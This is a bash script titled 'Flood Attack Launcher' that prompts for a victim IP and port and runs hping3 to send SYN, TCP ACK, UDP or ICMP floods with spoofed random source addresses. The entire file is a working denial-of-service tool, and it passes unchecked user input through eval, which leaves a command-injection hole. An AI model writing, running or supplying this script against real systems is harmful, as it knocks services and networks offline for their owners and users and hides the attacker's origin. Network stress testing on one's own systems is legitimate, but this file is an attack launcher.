#!/bin/bash

# A basic shell script to initiate different types of attacks

# check for root user 
if [ "$EUID" -ne 0 ]; then
  echo "❗ Please run this script with sudo (root privileges)."
  exit 1
fi

# Collect user inputs
echo "Flood Attack Launcher"
echo "------------------------"

read -p "Please enter sender IP address: " sender_ip
read -p "Please enter victim IP address: " victim_ip
read -p "Please enter victim port number: " port
echo ""

echo "Select the type of flood attack to initiate:"
echo "1) SYN Flooding"
echo "2) TCP Flooding"
echo "3) UDP Flooding"
echo "4) ICMP Flooding"
read -p "Enter choice [1-4]: " choice

read -p "Enter number of packets to send: (Select 0 for flooding)  " packet_count

echo ""
echo " Starting attack..."

# a function to handle flood modes
run_attack() {
  local command=$1
  echo "Executing: $command"
  eval "$command"
}

case "$choice" in
  1)
    if [ "$packet_count" -eq 0 ]; then
      run_attack "hping3 -S -p $port --flood --rand-source $victim_ip"
    else
      run_attack "hping3 -c $packet_count -S -p $port --rand-source $victim_ip"
    fi
    ;;

  2)
    if [ "$packet_count" -eq 0 ]; then
      run_attack "hping3 -A -p $port --flood --rand-source $victim_ip"
    else
      run_attack "hping3 -c $packet_count -A -p $port --rand-source $victim_ip"
    fi
    ;;

  3)
    if [ "$packet_count" -eq 0 ]; then
      run_attack "hping3 --udp -p $port --flood --rand-source $victim_ip"
    else
      run_attack "hping3 -c $packet_count --udp -p $port --rand-source $victim_ip"
    fi
    ;;

  4)
    if [ "$packet_count" -eq 0 ]; then
      run_attack "hping3 -1 --flood $victim_ip"
    else
      run_attack "hping3 -1 -c $packet_count $victim_ip"
    fi
    ;;
  *)
    echo "Incorrect choice. Exiting."
    exit 1
    ;;
esac

echo " Attack process initiated. Use Ctrl+C to stop if running in flood mode."
